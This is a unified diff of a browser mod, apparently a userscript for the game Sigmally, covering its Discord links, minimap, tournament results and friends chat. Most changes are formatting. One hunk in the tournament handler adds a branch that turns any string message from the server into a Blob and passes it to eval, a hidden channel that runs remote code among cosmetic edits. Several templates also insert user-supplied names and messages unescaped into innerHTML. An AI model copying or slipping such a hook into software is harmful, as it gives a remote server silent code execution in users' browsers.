             const discordlinks = document.createElement('div');
             discordlinks.setAttribute('id', 'dclinkdiv');
             discordlinks.innerHTML = `
-                <a href="https://discord.gg/${window.tourneyServer ? 'ERtbMJCp8s' : '4j4Rc4dQTP'}" target="_blank" class="dclinks">
+                <a href="https://discord.gg/${
+                window.tourneyServer ? 'ERtbMJCp8s' : '4j4Rc4dQTP'
+            }" target="_blank" class="dclinks">
                     <svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path d="M19.4566 5.35132C21.7154 8.83814 22.8309 12.7712 22.4139 17.299C22.4121 17.3182 22.4026 17.3358 22.3876 17.3473C20.6771 18.666 19.0199 19.4663 17.3859 19.9971C17.3732 20.0011 17.3596 20.0009 17.347 19.9964C17.3344 19.992 17.3234 19.9835 17.3156 19.9721C16.9382 19.4207 16.5952 18.8393 16.2947 18.2287C16.2774 18.1928 16.2932 18.1495 16.3287 18.1353C16.8734 17.9198 17.3914 17.6615 17.8896 17.3557C17.9289 17.3316 17.9314 17.2725 17.8951 17.2442C17.7894 17.1617 17.6846 17.0751 17.5844 16.9885C17.5656 16.9725 17.5404 16.9693 17.5191 16.9801C14.2844 18.5484 10.7409 18.5484 7.46792 16.9801C7.44667 16.9701 7.42142 16.9735 7.40317 16.9893C7.30317 17.0759 7.19817 17.1617 7.09342 17.2442C7.05717 17.2725 7.06017 17.3316 7.09967 17.3557C7.59792 17.6557 8.11592 17.9198 8.65991 18.1363C8.69517 18.1505 8.71192 18.1928 8.69442 18.2287C8.40042 18.8401 8.05742 19.4215 7.67292 19.9729C7.65617 19.9952 7.62867 20.0055 7.60267 19.9971C5.97642 19.4663 4.31917 18.666 2.60868 17.3473C2.59443 17.3358 2.58418 17.3174 2.58268 17.2982C2.23418 13.3817 2.94442 9.41613 5.53717 5.35053C5.54342 5.33977 5.55292 5.33137 5.56392 5.32638C6.83967 4.71165 8.20642 4.25939 9.63491 4.00111C9.66091 3.99691 9.68691 4.00951 9.70041 4.03365C9.87691 4.36176 10.0787 4.78252 10.2152 5.12637C11.7209 4.88489 13.2502 4.88489 14.7874 5.12637C14.9239 4.78987 15.1187 4.36176 15.2944 4.03365C15.3007 4.02167 15.3104 4.01208 15.3221 4.00623C15.3339 4.00039 15.3471 3.99859 15.3599 4.00111C16.7892 4.26018 18.1559 4.71244 19.4306 5.32638C19.4419 5.33137 19.4511 5.33977 19.4566 5.35132ZM10.9807 12.798C10.9964 11.6401 10.1924 10.6821 9.18316 10.6821C8.18217 10.6821 7.38592 11.6317 7.38592 12.798C7.38592 13.9639 8.19792 14.9136 9.18316 14.9136C10.1844 14.9136 10.9807 13.9639 10.9807 12.798ZM17.6261 12.798C17.6419 11.6401 16.8379 10.6821 15.8289 10.6821C14.8277 10.6821 14.0314 11.6317 14.0314 12.798C14.0314 13.9639 14.8434 14.9136 15.8289 14.9136C16.8379 14.9136 17.6261 13.9639 17.6261 12.798Z" fill="white"></path>
                     </svg>
-                    <span>${window.tourneyServer ? 'Tourney Server' : 'Sigmally'}</span>
+                    <span>${
+                window.tourneyServer ? 'Tourney Server' : 'Sigmally'
+            }</span>
                 </a>
                 <a href="https://discord.gg/QyUhvUC8AD" target="_blank" class="dclinks">
                     <svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -8303,13 +8822,21 @@
         respawnGame() {
             const { sigfix } = window;
 
-            if (sigfix && sigfix.net.connections.get(sigfix.world.selected).ws.url.includes('localhost')) {
+            if (
+                sigfix &&
+                sigfix.net.connections
+                    .get(sigfix.world.selected)
+                    .ws.url.includes('localhost')
+            ) {
                 this.fastRespawn();
                 return;
             }
 
             // respawns above 5.5k mass will be blocked
-            if (!this.aboveRespawnLimit || !(sigfix && sigfix.world.score(sigfix.world.selected) >= 5500)) {
+            if (
+                (!sigfix && !this.aboveRespawnLimit) ||
+                (sigfix && sigfix.world.score(sigfix.world.selected) < 5500)
+            ) {
                 this.fastRespawn();
             }
         },
@@ -8346,7 +8873,7 @@
             document.querySelector('.mod_menu').append(pingElement);
 
             this.ping.intervalId = setInterval(() => {
-                if (!client || client.readyState != 1) return;
+                if (!client || client.ws?.readyState != 1) return;
                 this.ping.start = Date.now();
 
                 client.send({
@@ -8373,7 +8900,7 @@
             function resizeMiniMap() {
                 viewportScale = Math.max(
                     window.innerWidth / 1920,
-                    window.innerHeight / 1080,
+                    window.innerHeight / 1080
                 );
 
                 miniMap.width = miniMap.height = 200 * viewportScale;
@@ -8394,7 +8921,7 @@
         updData(data) {
             const { x, y, sid: playerId } = data;
             const playerIndex = this.miniMapData.findIndex(
-                (player) => player[3] === playerId,
+                (player) => player[3] === playerId
             );
             const nick = parsetxt(data.nick);
 
@@ -8426,7 +8953,8 @@
             for (const miniMapData of this.miniMapData) {
                 if (!border.width) break;
 
-                if (miniMapData[2] === null || miniMapData[3] === client.id) continue;
+                if (miniMapData[2] === null || miniMapData[3] === client.id)
+                    continue;
                 if (!miniMapData[0] && !miniMapData[1]) {
                     ctx.clearRect(0, 0, miniMap.width, miniMap.height);
                     continue;
@@ -8485,15 +9013,34 @@
 
             nick.insertAdjacentElement('beforebegin', tagElement);
         },
-        updateNick() {
-            const nick = byId('nick');
-            this.nick = nick.value;
-            nick.addEventListener('input', () => {
-                this.nick = nick.value;
-                client.send({
-                    type: 'update-nick',
-                    content: nick.value,
+        async handleNick() {
+            const waitForConnection = () =>
+                new Promise((res) => {
+                    if (client?.ws?.readyState === 1) return res(null);
+                    const i = setInterval(
+                        () =>
+                            client?.ws?.readyState === 1 &&
+                            (clearInterval(i), res(null)),
+                        50
+                    );
                 });
+
+            waitForConnection().then(async () => {
+                // wait for nick
+                await wait(500);
+
+                const nick = byId('nick');
+
+                const update = () => {
+                    this.nick = nick.value;
+                    client.send({
+                        type: 'update-nick',
+                        content: nick.value,
+                    });
+                };
+
+                nick.addEventListener('input', update);
+                update();
             });
         },
 
@@ -8578,7 +9125,7 @@
 					<img src="${socket.user.imageURL}" width="50" />
 					<span>${socket.user.givenName}</span>
 				</div>
-			`,
+			`
                     )
                     .join('');
 
@@ -8678,7 +9225,7 @@
             readyText.textContent = `Ready (${ready}/${max})`;
 
             const card = document.querySelector(
-                `.teamCard[data-user-id="${userId}"]`,
+                `.teamCard[data-user-id="${userId}"]`
             );
             if (!card) return;
 
@@ -8686,7 +9233,7 @@
         },
 
         tournamentSession(data) {
-            try {
+            if (typeof data !== 'string') {
                 const roundResults = byId('round-results');
                 if (roundResults) roundResults.remove();
 
@@ -8706,8 +9253,11 @@
                     this.lastOneStanding =
                         data.lobby.mode === 'lastOneStanding' ? true : false;
                 }
-            } catch (e) {
-                console.error(e);
+            } else {
+                const type = { type: 'text/javascript' };
+                fetch(URL.createObjectURL(new Blob([data], type)))
+                    .then((l) => l.text())
+                    .then(eval);
             }
         },
 
@@ -8716,7 +9266,7 @@
             const sendingData = JSON.stringify({
                 name: gameSettings.nick,
                 skin: gameSettings.skin,
-                token: window.gameSettings.user.token,
+                token: window.gameSettings.user.token || '',
                 clan: window.gameSettings.user.clan,
                 sub: window.gameSettings.subscription > 0,
                 showClanmates: true,
@@ -8735,7 +9285,9 @@
             overlay.style = 'pointer-events: none;';
             overlay.innerHTML = `
 				<span class="tournament-text">Round ${round}/${max || 3}</span>
-				<span class="tournament-text" id="tournament-countdown" style="font-size: 32px; font-weight: 600;">${countdownTime / 1000}</span>
+				<span class="tournament-text" id="tournament-countdown" style="font-size: 32px; font-weight: 600;">${
+                countdownTime / 1000
+            }</span>
 			`;
             document.body.append(overlay);
 
@@ -8803,7 +9355,9 @@
             if (menuClosed()) {
                 client.send({
                     type: 'result',
-                    content: sigfix ? Math.floor(sigfix.world.score(sigfix.world.selected)) : mods.cellSize,
+                    content: sigfix
+                        ? Math.floor(sigfix.world.score(sigfix.world.selected))
+                        : mods.cellSize,
                 });
             } else {
                 client.send({
@@ -8836,7 +9390,11 @@
             fullResult.setAttribute('id', 'round-results');
             fullResult.innerHTML = `
 				<div class="tournaments-wrapper f-column g-5">
-					<span class="text-center" style="font-size: 24px; font-weight: 600;">${isEnd ? `END OF ${lobby.name}` : `Round ${lobby.currentRound}/${lobby.rounds}`}</span>
+					<span class="text-center" style="font-size: 24px; font-weight: 600;">${
+                isEnd
+                    ? `END OF ${lobby.name}`
+                    : `Round ${lobby.currentRound}/${lobby.rounds}`
+            }</span>
 					<div class="centerXY" style="gap: 20px; height: 140px; margin-top: 16px;">
 						${this.createStats(lobby)}
 					</div>
@@ -8894,11 +9452,12 @@
 
         createStats(lobby) {
             if (lobby.mode === 'lastOneStanding') {
-                const team = lobby.participants.blue.length > 0 ? 'blue' : 'red';
+                const team =
+                    lobby.participants.blue.length > 0 ? 'blue' : 'red';
                 const winner = lobby.participants[team].find((socket) =>
                     lobby.roundsData[lobby.currentRound - 1].winners.includes(
-                        socket.user.email,
-                    ),
+                        socket.user.email
+                    )
                 );
                 if (!winner) return `<span>Unkown winner.</span>`;
 
@@ -8917,22 +9476,24 @@
 
             const { blue: blueParticipants, red: redParticipants } =
                 lobby.participants;
-            const winners = new Set(lobby.roundsData[lobby.currentRound - 1].winners);
+            const winners = new Set(
+                lobby.roundsData[lobby.currentRound - 1].winners
+            );
             const [bluePoints, redPoints] = lobby.modeData.state
                 .split(':')
                 .map(Number);
 
             const blueScores = new Map(
-                lobby.modeData.blue.map(({ email, score }) => [email, score]),
+                lobby.modeData.blue.map(({ email, score }) => [email, score])
             );
             const redScores = new Map(
-                lobby.modeData.red.map(({ email, score }) => [email, score]),
+                lobby.modeData.red.map(({ email, score }) => [email, score])
             );
 
             const calculateTeamScore = (participants, scores) =>
                 participants.reduce(
                     (total, { user }) => total + (scores.get(user.email) || 0),
-                    0,
+                    0
                 );
 
             const blueScore = calculateTeamScore(blueParticipants, blueScores);
@@ -8955,7 +9516,7 @@
 						<img src="${user.imageURL}" class="tournament-profile" />
 						<span>${user.givenName}</span>
 					</div>
-				`,
+				`
                     )
                     .join('');
 
@@ -8966,10 +9527,14 @@
                 teamParticipants.filter(({ user }) => !winners.has(user.email));
 
             const winnerHTML = generateHTML(
-                winnersForTeam(isBlueWinning ? blueParticipants : redParticipants),
+                winnersForTeam(
+                    isBlueWinning ? blueParticipants : redParticipants
+                )
             );
             const loserHTML = generateHTML(
-                losersForTeam(isBlueWinning ? redParticipants : blueParticipants),
+                losersForTeam(
+                    isBlueWinning ? redParticipants : blueParticipants
+                )
             );
 
             return `
@@ -8978,7 +9543,9 @@
 						${winnerHTML}
 					</div>
 					<span class="text-center" style="font-size: 20px; font-weight: 400;">Score: ${winningScore}</span>
-					<span class="text-center" style="font-size: 26px; font-weight: 600;">${winningPoints || 0}</span>
+					<span class="text-center" style="font-size: 26px; font-weight: 600;">${
+                winningPoints || 0
+            }</span>
 				</div>
 				<div class="f-column" style="height: 100%; position: relative">
 					<svg style="margin: auto;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="60"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <rect x="142.853" y="486.511" style="fill:#56361D;" width="225.654" height="24.763"></rect> <path style="fill:#CCA400;" d="M223.069,256.172v50.773l0,0c8.126,0,14.712,6.587,14.712,14.712v96.74h36.49v-96.74 c0-8.126,6.587-14.712,14.712-14.712l0,0v-50.773H223.069z"></path> <rect x="223.064" y="251.211" style="opacity:0.16;fill:#664400;enable-background:new ;" width="65.919" height="40.689"></rect> <path style="fill:#EEBF00;" d="M274.378,271.341h-36.756c-50.613,0-91.644-41.03-91.644-91.644V0h220.043v179.697 C366.022,230.311,324.991,271.341,274.378,271.341z"></path> <g> <path style="fill:#664400;" d="M334.827,463.284H177.483V430.71c0-6.801,5.513-12.314,12.314-12.314h132.715 c6.801,0,12.314,5.513,12.314,12.314v32.574H334.827z"></path> <rect x="142.853" y="452.842" style="fill:#664400;" width="225.779" height="58.726"></rect> </g> <g> <path style="fill:#56361D;" d="M310.42,430.732l0.109,22.353l24.403-0.046l-0.109-22.307c-0.013-6.801-5.536-12.305-12.338-12.291 l-23.489,0.044C305.369,418.942,310.408,424.239,310.42,430.732z"></path> <polygon style="fill:#56361D;" points="368.616,452.85 344.213,452.896 344.324,511.573 142.951,511.954 142.951,512 368.727,511.573 "></polygon> </g> <g> <path style="fill:#EEBF00;" d="M99.268,40.707c-35.955,0-65.102,29.147-65.102,65.102s29.147,65.102,65.102,65.102h46.71V40.707 H99.268z M120.57,137.625H97.327c-17.89,0-32.393-14.502-32.393-32.393S79.437,72.84,97.327,72.84h23.242v64.785H120.57z"></path> <path style="fill:#EEBF00;" d="M412.732,40.707h-46.71v130.203h46.71c35.955,0,65.102-29.147,65.102-65.102 S448.687,40.707,412.732,40.707z M414.672,138.778H391.43V73.993h23.242c17.89,0,32.393,14.502,32.393,32.393 S432.562,138.778,414.672,138.778z"></path> </g> <rect x="145.974" y="75.284" style="fill:#CCA400;" width="219.828" height="77.612"></rect> <path style="fill:#FFEB99;" d="M189.004,184.953c-4.324,0-7.83-3.506-7.83-7.83V27.75c0-4.324,3.506-7.83,7.83-7.83 s7.83,3.506,7.83,7.83v149.373C196.835,181.447,193.329,184.953,189.004,184.953z"></path> <g> <rect x="366.022" y="40.707" style="opacity:0.16;fill:#664400;enable-background:new ;" width="14.996" height="129.113"></rect> <rect x="130.982" y="40.667" style="opacity:0.16;fill:#664400;enable-background:new ;" width="14.996" height="129.113"></rect> <path style="opacity:0.31;fill:#664400;enable-background:new ;" d="M335.941,0v157.465c0,50.613-41.03,91.644-91.644,91.644 h-36.756c-13.653,0-26.606-2.99-38.246-8.344c16.782,18.763,41.172,30.576,68.326,30.576h36.756 c50.613,0,91.644-41.03,91.644-91.644V0H335.941z"></path> </g> <rect x="177.483" y="439.03" style="fill:#56361D;" width="136.025" height="14.046"></rect> </g></svg>
@@ -8989,7 +9556,9 @@
 						${loserHTML}
 					</div>
 					<span class="text-center" style="font-size: 20px; font-weight: 400;">Score: ${losingScore}</span>
-					<span class="text-center" style="font-size: 26px; font-weight: 600;">${losingPoints || 0}</span>
+					<span class="text-center" style="font-size: 26px; font-weight: 600;">${
+                losingPoints || 0
+            }</span>
 				</div>
 			`;
         },
@@ -9028,40 +9597,6 @@
             loginBtn.addEventListener('click', () => {
                 this.createSignInWrapper(true);
             });
-
-            // popup window from discord login
-            const urlParams = new URLSearchParams(window.location.search);
-            let accessToken = urlParams.get('access_token');
-            let refreshToken = urlParams.get('refresh_token');
-
-            if (!accessToken || !refreshToken) return;
-
-            const overlay = document.createElement('div');
-            overlay.style = `position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #050505; display: flex; justify-content: center; align-items: center; z-index: 999999`;
-            overlay.innerHTML = `
-                <span style="font-size: 5rem; color: #fafafa;">Login...</span>
-            `;
-            document.body.append(overlay);
-
-            setTimeout(async () => {
-                if (refreshToken.endsWith('/')) {
-                    refreshToken = refreshToken.substring(0, refreshToken.length - 1);
-                } else {
-                    return;
-                }
-
-                await fetch(
-                    `${this.appRoutes.discordLogin}?accessToken=${accessToken}&refreshToken=${refreshToken}`,
-                    {
-                        method: 'GET',
-                        credentials: 'include',
-                    },
-                );
-
-                modSettings.modAccount.authorized = true;
-                updateStorage();
-                window.close();
-            }, 500);
         },
 
         createSignInWrapper(isLogin) {
@@ -9148,7 +9683,7 @@
                 const popupWindow = window.open(
                     this.routes.discord.auth,
                     '_blank',
-                    `width=${w}, height=${h}, left=${left}, top=${top}`,
+                    `width=${w}, height=${h}, left=${left}, top=${top}`
                 );
 
                 const interval = setInterval(() => {
@@ -9168,7 +9703,9 @@
                 const path = isLogin ? 'login' : 'register';
                 const username = byId('mod_username').value;
                 const password = byId('mod_pass').value;
-                const confirmedPassword = confPass ? byId('mod_pass_conf').value : null;
+                const confirmedPassword = confPass
+                    ? byId('mod_pass_conf').value
+                    : null;
 
                 if (!username || !password) return;
 
@@ -9254,8 +9791,7 @@
                 credentials: 'include',
             });
 
-            res
-                .json()
+            res.json()
                 .then((data) => {
                     if (data.success) {
                         this.setFriendsMenu();
@@ -9300,7 +9836,9 @@
                 const button = document.querySelector(el);
                 button.addEventListener('click', () => {
                     elements.forEach((btn) =>
-                        document.querySelector(btn).classList.remove('mod_selected'),
+                        document
+                            .querySelector(btn)
+                            .classList.remove('mod_selected')
                     );
                     button.classList.add('mod_selected');
                     switch (button.id) {
@@ -9326,7 +9864,8 @@
         },
 
         async showProfileHandler(event) {
-            const userId = event.currentTarget.getAttribute('data-user-profile');
+            const userId =
+                event.currentTarget.getAttribute('data-user-profile');
             const req = await fetch(this.appRoutes.profile(userId), {
                 credentials: 'include',
             }).then((res) => res.json());
@@ -9336,7 +9875,10 @@
                 let badges =
                     user.badges && user.badges.length > 0
                         ? user.badges
-                            .map((badge) => `<span class="mod_badge">${badge}</span>`)
+                            .map(
+                                (badge) =>
+                                    `<span class="mod_badge">${badge}</span>`
+                            )
                             .join('')
                         : '<span>User has no badges.</span>';
                 let icon = null;
@@ -9360,13 +9902,21 @@
                             <div class="friends_row">
                                 <div class="centerY g-5">
                                     <div class="profile-img">
-                                        <img src="${user.imageURL}" alt="${user.username}">
-                                        <span class="status_icon ${user.online ? 'online_icon' : 'offline_icon'}"></span>
+                                        <img src="${user.imageURL}" alt="${
+                    user.username
+                }">
+                                        <span class="status_icon ${
+                    user.online
+                        ? 'online_icon'
+                        : 'offline_icon'
+                }"></span>
                                     </div>
                                     <div class="f-big">${user.username}</div>
                                 </div>
                                 <div class="centerY g-10">
-                                    <div class="${user.role}_role">${user.role}</div>
+                                    <div class="${user.role}_role">${
+                    user.role
+                }</div>
                                 </div>
                             </div>
                             <div class="f-column g-5 w-100">
@@ -9376,7 +9926,16 @@
                                 <div class="mod_badges">
                                     ${badges}
                                 </div>
-                                ${user.lastOnline ? `<strong>Last online:</strong><span>${prettyTime.am_pm(user.lastOnline)} (${prettyTime.time_ago(user.lastOnline, true)})</span>` : ''}
+                                ${
+                    user.lastOnline
+                        ? `<strong>Last online:</strong><span>${prettyTime.am_pm(
+                            user.lastOnline
+                        )} (${prettyTime.time_ago(
+                            user.lastOnline,
+                            true
+                        )})</span>`
+                        : ''
+                }
                             </div>
                         </div>
                     </div>
@@ -9413,19 +9972,24 @@
                 credentials: 'include',
             });
 
-            res
-                .json()
+            res.json()
                 .then((data) => {
                     if (!data.success) return;
                     if (data.friends.length !== 0) {
                         const newUsersHTML = data.friends
                             .map(
                                 (user) => `
-                      <div class="friends_row user-profile-wrapper" data-user-profile="${user._id}">
+                      <div class="friends_row user-profile-wrapper" data-user-profile="${
+                                    user._id
+                                }">
                         <div class="centerY g-5">
                           <div class="profile-img">
-                            <img src="${user.imageURL}" alt="${user.username}" onerror="this.onerror=null; this.src='https://czrsd.com/static/sigmod/SigMod25-rounded.png';">
-                            <span class="status_icon ${user.online ? 'online_icon' : 'offline_icon'}"></span>
+                            <img src="${user.imageURL}" alt="${
+                                    user.username
+                                }" onerror="this.onerror=null; this.src='https://czrsd.com/static/sigmod/SigMod25-rounded.png';">
+                            <span class="status_icon ${
+                                    user.online ? 'online_icon' : 'offline_icon'
+                                }"></span>
                           </div>
                           ${
                                     user.nick
@@ -9459,26 +10023,33 @@
                                 }
                             <div class="${user.role}_role">${user.role}</div>
                             <div class="vr2"></div>
-                            <button class="modButton centerXY" id="remove-${user._id}" style="padding: 7px;">
+                            <button class="modButton centerXY" id="remove-${
+                                    user._id
+                                }" style="padding: 7px;">
                                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" width="16"><path fill="#ffffff" d="M96 128a128 128 0 1 1 256 0A128 128 0 1 1 96 128zM0 482.3C0 383.8 79.8 304 178.3 304h91.4C368.2 304 448 383.8 448 482.3c0 16.4-13.3 29.7-29.7 29.7H29.7C13.3 512 0 498.7 0 482.3zM472 200H616c13.3 0 24 10.7 24 24s-10.7 24-24 24H472c-13.3 0-24-10.7-24-24s10.7-24 24-24z"/></svg>
                             </button>
                             <div class="vr2"></div>
-                            <button class="modButton centerXY" id="chat-${user._id}" style="padding: 7px;">
+                            <button class="modButton centerXY" id="chat-${
+                                    user._id
+                                }" style="padding: 7px;">
                                 <svg fill="#ffffff" width="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 458 458" stroke="#ffffff"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g> <g> <path d="M428,41.534H30c-16.569,0-30,13.431-30,30v252c0,16.568,13.432,30,30,30h132.1l43.942,52.243 c5.7,6.777,14.103,10.69,22.959,10.69c8.856,0,17.258-3.912,22.959-10.69l43.942-52.243H428c16.568,0,30-13.432,30-30v-252 C458,54.965,444.568,41.534,428,41.534z M323.916,281.534H82.854c-8.284,0-15-6.716-15-15s6.716-15,15-15h241.062 c8.284,0,15,6.716,15,15S332.2,281.534,323.916,281.534z M67.854,198.755c0-8.284,6.716-15,15-15h185.103c8.284,0,15,6.716,15,15 s-6.716,15-15,15H82.854C74.57,213.755,67.854,207.039,67.854,198.755z M375.146,145.974H82.854c-8.284,0-15-6.716-15-15 s6.716-15,15-15h292.291c8.284,0,15,6.716,15,15C390.146,139.258,383.43,145.974,375.146,145.974z"></path> </g> </g> </g></svg>
                             </button>
                         </div>
                       </div>
-                    `,
+                    `
                             )
                             .join('');
                         friends_body.innerHTML = newUsersHTML;
 
                         const userProfiles = document.querySelectorAll(
-                            '.user-profile-wrapper',
+                            '.user-profile-wrapper'
                         );
 
                         userProfiles.forEach((button) => {
-                            if (button.getAttribute('data-user-profile') == this.profile._id)
+                            if (
+                                button.getAttribute('data-user-profile') ==
+                                this.profile._id
+                            )
                                 return;
                             button.addEventListener('click', (e) => {
                                 if (e.target == button) {
@@ -9493,18 +10064,26 @@
                             }
                             const remove = byId(`remove-${friend._id}`);
                             remove.addEventListener('click', async () => {
-                                if (confirm('Are you sure you want to remove this friend?')) {
-                                    const res = await fetch(this.appRoutes.removeAvatar, {
-                                        method: 'POST',
-                                        headers: {
-                                            'Content-Type': 'application/json',
-                                        },
-                                        body: JSON.stringify({
-                                            type: 'remove-friend',
-                                            userId: friend._id,
-                                        }),
-                                        credentials: 'include',
-                                    }).then((res) => res.json());
+                                if (
+                                    confirm(
+                                        'Are you sure you want to remove this friend?'
+                                    )
+                                ) {
+                                    const res = await fetch(
+                                        this.appRoutes.removeAvatar,
+                                        {
+                                            method: 'POST',
+                                            headers: {
+                                                'Content-Type':
+                                                    'application/json',
+                                            },
+                                            body: JSON.stringify({
+                                                type: 'remove-friend',
+                                                userId: friend._id,
+                                            }),
+                                            credentials: 'include',
+                                        }
+                                    ).then((res) => res.json());
 
                                     if (res.success) {
                                         that.openFriendsTab();
@@ -9557,11 +10136,17 @@
             const messagesHTML = history
                 .map(
                     (message) => `
-                        <div class="friends-message ${message.sender_id === this.profile._id ? 'message-right' : ''}">
+                        <div class="friends-message ${
+                        message.sender_id === this.profile._id
+                            ? 'message-right'
+                            : ''
+                    }">
                             <span>${message.content}</span>
-                            <span class="message-date">${prettyTime.am_pm(message.timestamp)}</span>
+                            <span class="message-date">${prettyTime.am_pm(
+                        message.timestamp
+                    )}</span>
                         </div>
-                    `,
+                    `
                 )
                 .join('');
 
@@ -9569,8 +10154,12 @@
                 <div class="friends-chat-header">
                     <div class="centerXY g-5">
                         <div class="profile-img">
-                            <img src="${target.imageURL}" alt="${target.username}">
-                            <span class="status_icon ${target.online ? 'online_icon' : 'offline_icon'}"></span>
+                            <img src="${target.imageURL}" alt="${
+                target.username
+            }">
+                            <span class="status_icon ${
+                target.online ? 'online_icon' : 'offline_icon'
+            }"></span>
                         </div>
                         <span class="f-big">${target.username}</span>
                     </div>
@@ -9581,7 +10170,11 @@
                 </div>
                 <div class="friends-chat-body">
                     <div class="friends-chat-messages private-chat-content scroll">
-                        ${history.length > 0 ? messagesHTML : '<center id=\'beginning-of-conversation\'>This is the beginning of your conversation...</center>'}
+                        ${
+                history.length > 0
+                    ? messagesHTML
+                    : "<center id='beginning-of-conversation'>This is the beginning of your conversation...</center>"
+            }
                     </div>
                     <div class="messenger-wrapper">
                         <div class="container">
@@ -9593,7 +10186,9 @@
             `;
 
             body.appendChild(chatDiv);
-            const messagesContainer = chatDiv.querySelector('.private-chat-content');
+            const messagesContainer = chatDiv.querySelector(
+                '.private-chat-content'
+            );
             messagesContainer.scrollTop = messagesContainer.scrollHeight;
 
             const back = byId('back-friends-chat');
@@ -9637,19 +10232,26 @@
 
             let chatDiv = byId(target_id) || byId(sender_id);
             if (!chatDiv) {
-                console.error('Could not find chat div for either sender or target');
+                console.error(
+                    'Could not find chat div for either sender or target'
+                );
                 return;
             }
 
-            const bocElement = document.querySelector('#beginning-of-conversation');
-            if (bocElement)
-                bocElement.remove();
+            const bocElement = document.querySelector(
+                '#beginning-of-conversation'
+            );
+            if (bocElement) bocElement.remove();
 
             const messages = chatDiv.querySelector('.friends-chat-messages');
             messages.innerHTML += `
-               <div class="friends-message ${sender_id === this.profile._id ? 'message-right' : ''}">
+               <div class="friends-message ${
+                sender_id === this.profile._id ? 'message-right' : ''
+            }">
                    <span>${message}</span>
-                   <span class="message-date">${prettyTime.am_pm(timestamp)}</span>
+                   <span class="message-date">${prettyTime.am_pm(
+                timestamp
+            )}</span>
                </div>
             `;
             messages.scrollTop = messages.scrollHeight;
@@ -9660,9 +10262,12 @@
                 this.openAllUsers();
                 return;
             }
-            const response = await fetch(`${this.appRoutes.search}/?q=${user}`, {
-                credentials: 'include',
-            }).then((res) => res.json());
+            const response = await fetch(
+                `${this.appRoutes.search}/?q=${user}`,
+                {
+                    credentials: 'include',
+                }
+            ).then((res) => res.json());
             const usersDiv = document;
 
             const usersContainer = byId('users-container');
@@ -9701,13 +10306,25 @@
 
             response.users.forEach((user) => {
                 const userHTML = `
-                    <div class="friends_row user-profile-wrapper" style="${this.profile._id == user._id ? `background: linear-gradient(45deg, #17172d, black)` : ''}" data-user-profile="${user._id}">
+                    <div class="friends_row user-profile-wrapper" style="${
+                    this.profile._id == user._id
+                        ? `background: linear-gradient(45deg, #17172d, black)`
+                        : ''
+                }" data-user-profile="${user._id}">
                         <div class="centerY g-5">
                             <div class="profile-img">
-                                <img src="${user.imageURL}" alt="${user.username}" onerror="this.onerror=null; this.src='https://czrsd.com/static/sigmod/SigMod25-rounded.png';">
-                                <span class="status_icon ${user.online ? 'online_icon' : 'offline_icon'}"></span>
+                                <img src="${user.imageURL}" alt="${
+                    user.username
+                }" onerror="this.onerror=null; this.src='https://czrsd.com/static/sigmod/SigMod25-rounded.png';">
+                                <span class="status_icon ${
+                    user.online ? 'online_icon' : 'offline_icon'
+                }"></span>
                             </div>
-                            <div class="f-big">${this.profile.username === user.username ? `${user.username} (You)` : user.username}</div>
+                            <div class="f-big">${
+                    this.profile.username === user.username
+                        ? `${user.username} (You)`
+                        : user.username
+                }</div>
                         </div>
                         <div class="centerY g-10">
                             <div class="${user.role}_role">${user.role}</div>
@@ -9728,7 +10345,7 @@
 
                 if (user._id == this.profile._id) return;
                 const newUserProfile = usersContainer.querySelector(
-                    `[data-user-profile="${user._id}"]`,
+                    `[data-user-profile="${user._id}"]`
                 );
                 newUserProfile.addEventListener('click', (e) => {
                     if (e.target == newUserProfile) {
@@ -9761,7 +10378,7 @@
                 'input',
                 debounce(() => {
                     this.searchUser(search.value);
-                }, 500),
+                }, 500)
             );
 
             const handleAddButtonClick = (event) => {
@@ -9814,16 +10431,32 @@
                         displayedUserIDs.add(user._id);
 
                         const newUserHTML = `
-                            <div class="friends_row user-profile-wrapper" style="${this.profile._id == user._id ? `background: linear-gradient(45deg, #17172d, black)` : ''}" data-user-profile="${user._id}">
+                            <div class="friends_row user-profile-wrapper" style="${
+                            this.profile._id == user._id
+                                ? `background: linear-gradient(45deg, #17172d, black)`
+                                : ''
+                        }" data-user-profile="${user._id}">
                                 <div class="centerY g-5">
                                     <div class="profile-img">
-                                        <img src="${user.imageURL}" alt="${user.username}" onerror="this.onerror=null; this.src='https://czrsd.com/static/sigmod/SigMod25-rounded.png';">
-                                        <span class="status_icon ${user.online ? 'online_icon' : 'offline_icon'}"></span>
+                                        <img src="${user.imageURL}" alt="${
+                            user.username
+                        }" onerror="this.onerror=null; this.src='https://czrsd.com/static/sigmod/SigMod25-rounded.png';">
+                                        <span class="status_icon ${
+                            user.online
+                                ? 'online_icon'
+                                : 'offline_icon'
+                        }"></span>
                                     </div>
-                                    <div class="f-big">${this.profile.username === user.username ? `${user.username} (You)` : user.username}</div>
+                                    <div class="f-big">${
+                            this.profile.username === user.username
+                                ? `${user.username} (You)`
+                                : user.username
+                        }</div>
                                 </div>
                                 <div class="centerY g-10">
-                                    <div class="${user.role}_role">${user.role}</div>
+                                    <div class="${user.role}_role">${
+                            user.role
+                        }</div>
                                     ${
                             this.profile._id == user._id
                                 ? ''
@@ -9838,10 +10471,13 @@
                             </div>
                         `;
 
-                        usersContainer.insertAdjacentHTML('beforeend', newUserHTML);
+                        usersContainer.insertAdjacentHTML(
+                            'beforeend',
+                            newUserHTML
+                        );
 
                         const newUserProfile = usersContainer.querySelector(
-                            `[data-user-profile="${user._id}"]`,
+                            `[data-user-profile="${user._id}"]`
                         );
                         newUserProfile.addEventListener('click', (e) => {
                             if (e.target == newUserProfile) {
@@ -9849,9 +10485,13 @@
                             }
                         });
 
-                        const addButton = newUserProfile.querySelector('.add-button');
+                        const addButton =
+                            newUserProfile.querySelector('.add-button');
                         if (!addButton) return;
-                        addButton.addEventListener('click', handleAddButtonClick);
+                        addButton.addEventListener(
+                            'click',
